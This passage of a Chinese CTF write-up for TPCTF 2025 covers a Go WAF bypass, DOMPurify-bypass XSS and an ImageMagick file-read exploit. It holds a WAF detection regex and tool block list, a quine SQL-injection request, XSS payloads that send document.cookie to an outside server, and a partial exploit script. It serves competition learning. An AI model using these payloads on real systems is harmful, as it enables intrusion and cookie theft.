class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;mime&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backendURL = <span class="string">&quot;http://127.0.0.1:8000&quot;</span></span><br><span class="line"><span class="keyword">const</span> backendHost = <span class="string">&quot;127.0.0.1:8000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blockedIPs = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>&#123;</span><br><span class="line">	<span class="string">&quot;1.1.1.1&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sqlInjectionPattern = regexp.MustCompile(<span class="string">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rcePattern = regexp.MustCompile(<span class="string">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hotfixPattern = regexp.MustCompile(<span class="string">`(?i)(select)`</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blockedUserAgents = []<span class="type">string</span>&#123;</span><br><span class="line">	<span class="string">&quot;sqlmap&quot;</span>,</span><br><span class="line">	<span class="string">&quot;nmap&quot;</span>,</span><br><span class="line">	<span class="string">&quot;curl&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isBlockedIP</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> blockedIPs[ip]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isMaliciousRequest</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> key, values := <span class="keyword">range</span> r.URL.Query() &#123;</span><br><span class="line">		<span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line">			<span class="keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;阻止 SQL 注入: 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> rcePattern.MatchString(value) &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;阻止 RCE 攻击: 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> hotfixPattern.MatchString(value) &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;参数 %s=%s&quot;</span>, key, value)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">		ct := r.Header.Get(<span class="string">&quot;Content-Type&quot;</span>)</span><br><span class="line">		mediaType, _, err := mime.ParseMediaType(ct)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Printf(<span class="string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> mediaType == <span class="string">&quot;multipart/form-data&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err := r.ParseMultipartForm(<span class="number">65535</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err := r.ParseForm(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> key, values := <span class="keyword">range</span> r.PostForm &#123;</span><br><span class="line">			log.Printf(<span class="string">&quot;POST 参数 %s=%v&quot;</span>, key, values)</span><br><span class="line">			<span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line">				<span class="keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;</span><br><span class="line">					log.Printf(<span class="string">&quot;阻止 SQL 注入: POST 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> rcePattern.MatchString(value) &#123;</span><br><span class="line">					log.Printf(<span class="string">&quot;阻止 RCE 攻击: POST 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> hotfixPattern.MatchString(value) &#123;</span><br><span class="line">					log.Printf(<span class="string">&quot;POST 参数 %s=%s&quot;</span>, key, value)</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isBlockedUserAgent</span><span class="params">(userAgent <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> _, blocked := <span class="keyword">range</span> blockedUserAgents &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseProxyHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	clientIP := r.RemoteAddr</span><br><span class="line">	<span class="keyword">if</span> isBlockedIP(clientIP) &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Forbidden&quot;</span>, http.StatusForbidden)</span><br><span class="line">		log.Printf(<span class="string">&quot;阻止的 IP: %s&quot;</span>, clientIP)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bodyBytes, err := io.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isMaliciousRequest(r) &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)</span><br><span class="line">		log.Printf(<span class="string">&quot;阻止的 User-Agent: %s&quot;</span>, r.UserAgent())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	proxyReq.Header = r.Header</span><br><span class="line"></span><br><span class="line">	client := &amp;http.Client&#123;</span><br><span class="line">		CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	resp, err := client.Do(proxyReq)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> key, values := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">		<span class="keyword">for</span> _, value := <span class="keyword">range</span> values &#123;</span><br><span class="line">			<span class="keyword">if</span> key == <span class="string">&quot;Location&quot;</span> &#123;</span><br><span class="line">				value = strings.Replace(value, backendHost, r.Host, <span class="number">-1</span>)</span><br><span class="line">			&#125;</span><br><span class="line">			w.Header().Add(key, value)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	w.WriteHeader(resp.StatusCode)</span><br><span class="line">	io.Copy(w, resp.Body)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, reverseProxyHandler)</span><br><span class="line">	log.Println(<span class="string">&quot;Listen on 0.0.0.0:8080&quot;</span>)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个<code>waf</code>是实现了一个简单的反向代理服务器，主要功能是将客户端请求转发到后端服务器，同时具备一定的安全防护机制，能够检测<code>SQL</code>注入、远程代码执行<code>RCE</code>攻击，以及屏蔽特定的 <code>IP</code> 和用户代理。</p>
<p>但是我们通过POST，感觉是没有办法绕过waf的。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">		ct := r.Header.Get(<span class="string">&quot;Content-Type&quot;</span>)</span><br><span class="line">		mediaType, _, err := mime.ParseMediaType(ct)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Printf(<span class="string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> mediaType == <span class="string">&quot;multipart/form-data&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err := r.ParseMultipartForm(<span class="number">65535</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err := r.ParseForm(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Printf(<span class="string">&quot;解析 POST 参数失败: %v&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这里有点奇怪的，明明没有任何文件上传的点，可是这里有个关于文件上传的multipart&#x2F;form-data</p>
<p>这里提供一些文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E5%88%9D%E7%BA%A7">https://www.geekby.site/2022/03/waf-bypass/#bypass-%E6%80%9D%E8%B7%AF---%E5%88%9D%E7%BA%A7</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Thewei666/article/details/142408096">https://blog.csdn.net/Thewei666/article/details/142408096</a></p>
<p>这里后来去学了一下，详情<code>WAF Bypass</code>笔记。</p>
<p>这里的go文件其实就相当于一个waf，python作为后端，那么我们可以通过一些手法来绕过waf，实现sql注入，同时这里sql注入的方法是quine注入！</p>
<p>注意一下：这里python作为后端，可能识别的是第二行的，waf识别第一行从而绕过！</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250326192812797.png" class="" title="This is an example image">

<p>感觉要拿下了，直接绕过了waf。接下来就是quine注入，在password中构造。</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250326195757686.png" class="" title="This is an example image">

<p>这里卡了好久！！sqlite没有<code>#</code>注释符！！！！要换用<code>-- </code>，同时要注意union select后的1,2，这也是不能少的！我的理解是3是对应的回显位。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /flag/ HTTP/1.1</span><br><span class="line">Host: 156.238.233.113:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: multipart/form-data; boundary=aaa;</span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">--aaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">--aaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;;filename=&quot;1&quot;;</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">1&#x27;/**/union/**/select/**/1,2,replace(replace(&#x27;1&quot;/**/union/**/select/**/1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/1,2,replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)-- &#x27;)-- </span><br><span class="line">--aaa--</span><br></pre></td></tr></table></figure>





<h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h2><p>这道题的web界面和bot界面和baby layout是一模一样的。</p>
<p>那么接下来我们找一下区别。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const sanitizedContent = DOMPurify.sanitize(content, &#123; ALLOWED_ATTR: [] &#125;);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout, &#123; ALLOWED_ATTR: [] &#125;);</span><br><span class="line"></span><br><span class="line">const sanitizedContent = DOMPurify.sanitize(content);</span><br><span class="line">const sanitizedLayout = DOMPurify.sanitize(layout);</span><br></pre></td></tr></table></figure>

<p>问一下ai他们的区别。</p>
<blockquote>
<p><code>&#123; ALLOWED_ATTR: [] &#125;</code>：</p>
<ul>
<li><code>ALLOWED_ATTR</code> 是 DOMPurify 的选项，用于指定 <strong>允许的 HTML 属性</strong>。</li>
<li><code>[]</code> 为空数组，表示<strong>不允许任何 HTML 属性</strong>（如 <code>href</code>、<code>src</code>、<code>onclick</code> 等）。</li>
<li>但<strong>HTML 标签仍然可以保留</strong>，比如 <code>&lt;b&gt;text&lt;/b&gt;</code> 仍然有效，但 <code>&lt;a href=&quot;example.com&quot;&gt;link&lt;/a&gt;</code> 会变成 <code>&lt;a&gt;link&lt;/a&gt;</code>（因为 <code>href</code> 被移除）。</li>
</ul>
</blockquote>
<p>先本地看看效果：</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250326210831685.png" class="" title="This is an example image">

<p>除了html标签都没了！</p>
<p><a target="_blank" rel="noopener" href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations</a></p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250326233334620.png" class="" title="This is an example image">

<p>我们可以用这种方法来绕过！</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250326233448334.png" class="" title="This is an example image">

<p>拼接一下吧~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img aria-meteor=&quot;&#123;&#123;content&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">x&quot; src=&quot;x&quot; onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>

<img src="/2025/03/30/TPCTF2025-wp/image-20250327003038456.png" class="" title="This is an example image">

<p>感觉是可以了！</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250327003114722.png" class="" title="This is an example image">





<h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>附件密码：TPCTF{D0_n07_M0D1FY_7h3_0U7PU7_Af73R_H7mL_5aN171z1n9}</p>
<p>变化如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitizedContent = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content, &#123;</span><br><span class="line">    <span class="attr">ALLOWED_ATTR</span>: [],</span><br><span class="line">    <span class="attr">ALLOW_ARIA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">ALLOW_DATA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> sanitizedLayout = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(layout, &#123;</span><br><span class="line">    <span class="attr">ALLOWED_ATTR</span>: [],</span><br><span class="line">    <span class="attr">ALLOW_ARIA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">ALLOW_DATA_ATTR</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>这下子把data和aria都ban了。</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250328165443147.png" class="" title="This is an example image">

<p>本地测一下：</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250328165619960.png" class="" title="This is an example image">

<p>整体思路是采用 style 绕过，测试发现当 style 标签前面跟上一些字符时，style 内部的元素可能会得以保留，故这里采用的是删除策略，把 xss 的 payload 构造好后，把 script 标签插入 content，在第二次 post 的时候删除就行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=&quot;window.open(&#x27;http://156.238.233.113:4567/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;</span><br></pre></td></tr></table></figure>

<img src="/2025/03/30/TPCTF2025-wp/image-20250328170944060.png" class="" title="This is an example image">

<img src="/2025/03/30/TPCTF2025-wp/image-20250328171011261.png" class="" title="This is an example image">



<h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>只给了一个Dockerfile。打开看看。附件给的是thumbor的插件环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.7.11-buster</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y libexiv2-dev libboost-python-dev exiftool</span><br><span class="line">RUN git clone --depth 1 https://gerrit.wikimedia.org/r/operations/software/thumbor-plugins</span><br><span class="line">RUN pip install -r thumbor-plugins/requirements.txt</span><br><span class="line">RUN dd if=thumbor-plugins/README.md of=thumbor.conf bs=1 count=1947 skip=610</span><br><span class="line">RUN echo TPCTF&#123;...&#125; &gt; /flag</span><br><span class="line">ENV PYTHONPATH=/thumbor-plugins</span><br><span class="line">ENTRYPOINT thumbor --port 8800 --conf=thumbor.conf -a wikimedia_thumbor.app.App</span><br></pre></td></tr></table></figure>

<p>我们可以看到他下载了thumbor-plugins，我们下载一下源码看看。</p>
<p>注意，这里的源码要在docker中下载才行哦~</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250329151611253.png" class="" title="This is an example image">

<p>这里主要需要关注engine文件夹和handler文件夹。一个引擎一个路由。</p>
<p>发现handler文件夹下有三个文件夹，对应三个路由。</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250329151740837.png" class="" title="This is an example image">

<p>再看看engine文件夹，在其中发现了imagemagick。</p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250329151836721.png" class="" title="This is an example image">

<blockquote>
<p><strong>About</strong></p>
<p>ImageMagick is a powerful, open-source software suite for creating, editing, converting, and manipulating images in over 200 formats. Ideal for web developers, graphic designers, and researchers, it offers versatile tools for image processing, including batch processing, format conversion, and complex image transformations.</p>
</blockquote>
<p>那么就是说明thumbor-plugins中用到了imagemagick，如果imagemagick存在漏洞那么就可以打啦~</p>
<p>网上可以搜到cve2016的和cve2022的，直接尝试用2022的任意文件读取。</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/article/444">https://forum.butian.net/article/444</a></p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250329154503313.png" class="" title="This is an example image">

<p>环境是好的，那么接下来就是漏洞利用了。</p>
<p>但是这个漏洞需要我们上传恶意图片到服务端啊，可是这thumbor1没有任何上传的地方。</p>
<p><a target="_blank" rel="noopener" href="https://thumbor.readthedocs.io/en/latest/security.html">https://thumbor.readthedocs.io/en/latest/security.html</a></p>
<img src="/2025/03/30/TPCTF2025-wp/image-20250329155915387.png" class="" title="This is an example image">

<p>那么我们就可以把恶意图片放到自己的vps，让靶机去访问我们！</p>
<p>poc.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stderr, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">d = zlib.decompressobj()</span><br><span class="line">e = zlib.compressobj()</span><br><span class="line">IHDR = <span class="string">b&#x27;\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">IDAT = <span class="string">b&#x27;x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_data</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    _, data = data.strip().split(<span class="string">b&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(data.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a input filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = png.Reader(filename=filename)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">        logging.info(<span class="string">&quot;chunk %s found, value = %r&quot;</span>, k.decode(), v)</span><br><span class="line">        <span class="keyword">if</span> k == <span class="string">b&#x27;zTXt&#x27;</span>:</span><br><span class="line">            name, data = v.split(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            res = parse_data(d.decompress(data[<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        sys.stdout.write(res)</span><br><span class="line">        sys.stdout.flush()</span><br><span 